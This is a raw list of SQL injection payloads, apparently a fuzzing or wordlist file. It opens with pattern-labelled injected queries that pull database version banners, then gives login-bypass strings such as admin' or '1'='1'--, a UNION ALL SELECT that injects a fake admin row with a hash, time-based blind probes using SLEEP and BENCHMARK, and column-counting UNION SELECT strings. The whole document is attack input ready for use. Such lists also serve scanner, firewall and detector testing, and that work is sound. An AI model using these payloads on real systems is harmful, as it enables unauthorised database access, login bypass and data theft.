"so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'"
"so1UE: select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'"
"so1s: select * from users where id=1 or ""%1"" or 1=1 -- 1"
"so:s: select * from users where id=1 or ""&:"" or 1=1 -- 1"
"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1"
"so?s: select * from users where id=1 or ""%?"" or 1=1 -- 1"
"soc: select * from users where id='1' + @<@# union select 1,version() -- 1'"
son.&: select * from users where id='1' *$ . or 1=1 -- 1'
"son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'"
son1&: select * from users where id='1' *$ 1 or 1=1 -- 1'
"son: select * from users where id=1 or ""%["" or 1=1 -- 1"
sonn&: select * from users where id='1' <@$_ or 1=1 -- 1'
"sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'"
"sons: select * from users where id=1 or ""%_"" or 1=1 -- 1"
soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1'
soo1&: select * from users where id='1' <@&1 or 1=1 -- 1'
"soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'"
"sooUE: select * from users where id='1' <@<@ union select 1,version() -- 1'"
soon&: select * from users where id='1' + $+%$ or 1=1 -- 1'
"soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'"
"soos: select * from users where id=1 or ""%&"" or 1=1 -- 1"
soov&: select * from users where id='1' <@&@ or 1=1 -- 1'
"soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'"
"sos: select * from users where id='1'<@$$ union select 1,version() -- 1'"
"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'"
"sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'"
"sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'"
"sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'"
"so{s: select * from users where id=1 or ""%{"" or 1=1 -- 1"
"sv(s: select * from users where id=1 or ""@("" or 1=1 -- 1"
"sv)s: select * from users where id=1 or ""@)"" or 1=1 -- 1"
"sv:s: select * from users where id=1 or ""@:""=1 or 1=1 -- 1"
"sv;s: select * from users where id=1 or ""@;""=1 or 1=1 -- 1"
"sv?s: select * from users where id=1 or ""@?"" or 1=1 -- 1"
"svUE1: select * from users where id=1 or 1#""@ union select 1,version() -- 1"
"svUEf: select * from users where id=1 or 1#""@ union select version(),version() -- 1"
"svUEs: select * from users where id=1 or 1#""@ union select 'a',version() -- 1"
"svUEv: select * from users where id=1 or 1#""@ union select null,version() -- 1"
"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1"
"svos: select * from users where id=1 or ""@%"" or 1=1 -- 1"
"s{(s: select * from users where id=1 or ""{(""=1 or 1=1 -- 1"
"s{)s: select * from users where id=1 or ""{)"" or 1=1 -- 1"
"s{,s: select * from users where id=1 or ""{,""=1 or 1=1 -- 1"
"s{.s: select * from users where id=1 or ""{."" or 1=1 -- 1"
"s{1s: select * from users where id=1 or ""{1""=1 or 1=1 -- 1"
"s{:s: select * from users where id=1 or ""{:"" or 1=1 -- 1"
"s{;s: select * from users where id=1 or ""{;"" or 1=1 -- 1"
"s{?s: select * from users where id=1 or ""{?"" or 1=1 -- 1"
"s{UE1: select * from users where id=1 or 1#""{ union select 1,version() -- 1"
"s{UEf: select * from users where id=1 or 1#""{ union select version(),version() -- 1"
"s{UEs: select * from users where id=1 or 1#""{ union select 'a',version() -- 1"
"s{UEv: select * from users where id=1 or 1#""{ union select null,version() -- 1"
"s{c: select * from users where id=1 or ""{#"" or 1=1 -- 1"
"s{o1&: select * from users where id=1 or @#""{=1 or 1=1 -- 1"
"s{o1U: select * from users where id=1 or @#""{=1 union select 1,version() -- 1"
"s{os: select * from users where id=1 or ""{%"" or 1=1 -- 1"
"s{v: select * from users where id=1 or ""{@"" or 1=1 -- 1"
"s{{s: select * from users where id=1 or ""{{"" or 1=1 -- 1"
"v: select * from users where id=1 + @`\` union select 1,version() -- 1"
"vc: select * from users where id=1 + @<1# union select 1,version() -- 1"
"vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1"
"voUE1: select * from users where id=1 -@<@ union select 1,version() -- 1"
"voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1"
"voUEv: select * from users where id=1 -@<@ union select null,version() -- 1"
"voc: select * from users where id=1 + @<@# union select null,version() -- 1"
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"""-"""
""" """
"""&"""
"""^"""
"""*"""
""" or """"-"""
""" or """" """
""" or """"&"""
""" or """"^"""
""" or """"*"""
or true--
""" or true--"
' or true--
""") or true--"
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
""" or ""x""=""x"
""") or (""x"")=(""x"
""")) or ((""x""))=((""x"
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
"admin"" --"
"admin"" #"
"admin""/*"
"admin"" or ""1""=""1"
"admin"" or ""1""=""1""--"
"admin"" or ""1""=""1""#"
"admin"" or ""1""=""1""/*"
"admin""or 1=1 or """"="""
"admin"" or 1=1"
"admin"" or 1=1--"
"admin"" or 1=1#"
"admin"" or 1=1/*"
"admin"") or (""1""=""1"
"admin"") or (""1""=""1""--"
"admin"") or (""1""=""1""#"
"admin"") or (""1""=""1""/*"
"admin"") or ""1""=""1"
"admin"") or ""1""=""1""--"
"admin"") or ""1""=""1""#"
"admin"") or ""1""=""1""/*"
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
ORDER BY SLEEP(5)
"ORDER BY 1,SLEEP(5)"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
ORDER BY SLEEP(5)#
"ORDER BY 1,SLEEP(5)#"
"ORDER BY 1,SLEEP(5),3#"
"ORDER BY 1,SLEEP(5),3,4#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#"
ORDER BY SLEEP(5)--
"ORDER BY 1,SLEEP(5)--"
"ORDER BY 1,SLEEP(5),3--"
"ORDER BY 1,SLEEP(5),3,4--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--"
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
UNION ALL SELECT 1
"UNION ALL SELECT 1,2"
"UNION ALL SELECT 1,2,3"
"UNION ALL SELECT 1,2,3,4"
"UNION ALL SELECT 1,2,3,4,5"
"UNION ALL SELECT 1,2,3,4,5,6"
"UNION ALL SELECT 1,2,3,4,5,6,7"
"UNION ALL SELECT 1,2,3,4,5,6,7,8"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
UNION ALL SELECT 1#
"UNION ALL SELECT 1,2#"
"UNION ALL SELECT 1,2,3#"
"UNION ALL SELECT 1,2,3,4#"
"UNION ALL SELECT 1,2,3,4,5#"
"UNION ALL SELECT 1,2,3,4,5,6#"
"UNION ALL SELECT 1,2,3,4,5,6,7#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#"
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#"
